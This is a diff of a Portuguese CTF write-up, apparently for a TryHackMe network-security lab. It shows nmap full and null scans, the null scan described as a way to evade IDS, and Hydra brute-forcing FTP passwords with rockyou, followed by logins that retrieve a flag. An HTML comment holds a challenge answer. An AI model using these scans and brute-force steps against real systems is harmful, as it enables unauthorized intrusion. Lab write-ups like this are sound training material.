@@ -7,7 +7,6 @@ tags: [CTF-Médio, nmap, telnet, hydra]
 media_subpath: /assets/images/netsecchallenge
 image:
   path: capa.webp
-  alt: Pratique as habilidades que você aprendeu no módulo Segurança de Rede.
 comments: true
 ---
 
@@ -17,6 +16,7 @@ Este desafio foi desenvolvido para avaliar o domínio das habilidades apresentad
 ## Perguntas do Desafio
 ### Nmap
 Realizei uma varredura completa na máquina-alvo. Cada parâmetro foi escolhido com um propósito específico, facilitando a coleta das informações necessárias para responder às perguntas do desafio.
+
 ```console
 nmap -p- -sC -sV -n -Pn -T4 10.10.32.74
 ```
@@ -40,6 +40,7 @@ nmap -p- -sC -sV -n -Pn -T4 10.10.32.74
 - `-T4` Define o tempo/agressividade da varredura como “rápido”.
 
 Saída do comando:
+
 ```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ nmap -p- -sC -sV -n -Pn -T4 10.10.26.196 
@@ -87,9 +88,11 @@ Nmap done: 1 IP address (1 host up) scanned in 611.55 seconds
 > Pergunta: Acesse o endereço http://MACHINE_IP:8080. Você verá um pequeno desafio interativo. Resolva-o para obter uma flag. Qual é a flag exibida ao concluir o desafio? <!-- THM{321452667098} -->
 
 Ao acessar o site, me deparei com a seguinte interface:
+
 ![](pagina-8080.webp)
 
 Realizei um **Null Scan** `nmap -sN 10.10.26.196`, com isso, consegui capturar a flag. 
+
 ![](flag.webp)
 
 Saída do comando:
@@ -110,6 +113,7 @@ PORT     STATE         SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
 ```
+
 - `-sN` O Nmap envia pacotes TCP sem nenhuma flag ativada no cabeçalho. Isso significa que ele envia um pacote completamente **em branco** para uma porta. Essa técnica é considerada uma **varredura furtiva**, usada principalmente para tentar evadir firewalls e sistemas de detecção de intrusão `IDS`.
 
 ### Hidra + Telnet
@@ -117,6 +121,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
 
 ### Eddie
 Comecei testando o usuário `eddie` utilizando o Hydra para força bruta no serviço FTP. Após alguns segundos, encontrei a senha:
+
 ```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.26.196 -s 10021           
@@ -131,6 +136,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-13 18:12:
 ```
 
 Conectei ao servidor FTP com as credenciais encontradas. Naveguei até o diretório inicial e listei os arquivos. Apesar de acessar o conteúdo, não encontrei nenhuma flag escondida no diretório:
+
 ```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ ftp 10.10.26.196 10021
@@ -160,6 +166,7 @@ ftp> exit
 
 ### Quinn
 Com o usuário `quinn`, novamente usando Hydra, o ataque foi bem-sucedido e me revelou a senha:
+
 ```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.26.196 -s 10021
@@ -174,6 +181,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-13 18:13:
 ```
 
 Fiz login, Dessa vez, ao listar os arquivos do diretório, encontrei um arquivo `ftp_flag.txt`:
+
 ```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ ftp 10.10.26.196 10021
@@ -208,7 +216,9 @@ local: ftp_flag.txt remote: ftp_flag.txt
 ftp> exit
 221 Goodbye.
 ```
+
 E ao abrir o arquivo, encontrei a flag:
+
 ```console               
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ cat ftp_flag.txt                                    
